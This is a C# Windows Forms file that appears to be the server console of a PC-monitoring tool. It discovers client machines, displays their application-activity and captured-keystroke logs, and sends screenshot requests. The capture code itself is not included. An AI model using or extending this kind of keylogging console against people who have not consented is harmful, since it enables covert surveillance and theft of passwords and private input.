using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace Server
{ 
    public partial class Form1 : Form
    {
        Thread broadcost;
        ServerTools servertool;
        string clientname = "";
        Panel panel;
        bool flag;
        public Form1()
        {
            
            //this.ShowInTaskbar = false;
            InitializeComponent();
            linkLabel1.Visible = false;
            linkLabel1.Enabled = false;
            //this.Visible = false;
            //load();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //Thread broadcost = new Thread(ServerTools.broadcost);
            //broadcost.Start();
            //Thread.Sleep(10000);
            //broadcost.Abort();
            ////textBox1.Text = ServerTools.keybuffer[0];
        }
        private void load()
        {
            int i = 0;
            int y = 8;
            broadcost = new Thread(ServerTools.Broadcost);
            broadcost.Start();
            Thread.Sleep(1000);
            broadcost.Abort();
            panel = new Panel();
            panel.Size = new Size(185, 605);
            panel.Location = new Point(4, 33);
            panel.BorderStyle = BorderStyle.Fixed3D;
            if (panel.HasChildren)
            {
                panel.Controls.Clear();
            }
            while (i < ServerTools.hop)
            {
                Button but = new Button();
                but.Size = new System.Drawing.Size(190, 28);
                but.Location = new Point(0, y);
                but.FlatStyle = FlatStyle.Standard;
                but.BackColor = SystemColors.GradientActiveCaption;
                but.TextAlign = ContentAlignment.MiddleLeft;
                but.Text = ServerTools.keybuffer[i];
                but.Click += but_Click;
                y += 30;
                panel.Controls.Add(but);
                i++;
            }
            panel1.Controls.Add(panel);
        }

        void but_Click(object sender, EventArgs e)
        {
            servertool = new ServerTools();
            Button but = (Button)sender;
            label2.Text = "Activity Log of " + but.Text + " PC";
            clientname = but.Text; 
            Properties.Settings setting = new Properties.Settings();
            string filepath = setting.DefaultPath+"pvtna"+"App.lab";
            richTextBox1.Text = servertool.GetFile(filepath);
            linkLabel1.Visible = true;
            linkLabel1.Enabled = true;
            flag = true;
            ScreenshotLink.Tag = but.Text;
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
             Properties.Settings setting = new Properties.Settings();
             if (flag)
             {
                 string filepath = setting.DefaultPath + clientname + "KeyStroke.lab";
                 richTextBox1.Text = servertool.GetFile(filepath);
                 linkLabel1.Text = "Activity Log";
                 flag = false;
             }
             else
             {
                 string filepath = setting.DefaultPath + clientname + "App.lab";
                 richTextBox1.Text = servertool.GetFile(filepath);
                 linkLabel1.Text = "Key Stroke";
                 flag = true;
             }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            load();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void ScreenshotLink_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            ServerTools.SendScreenshotSignal(ScreenshotLink.Tag.ToString());
        }
        ////private void threadkill(Thread th)
        ////{
        ////    Thread.Sleep(30000);
        ////    MessageBox.Show("kjzcnjsncjnksdc");
        ////    th.Abort();
        ////}
        //protected void t1_tick(object sender, EventArgs e)
        //{
        //    broadcost.Abort();
        //    MessageBox.Show("bnd kro lapi");
        //    t1.Dispose();
        //}
    }
}
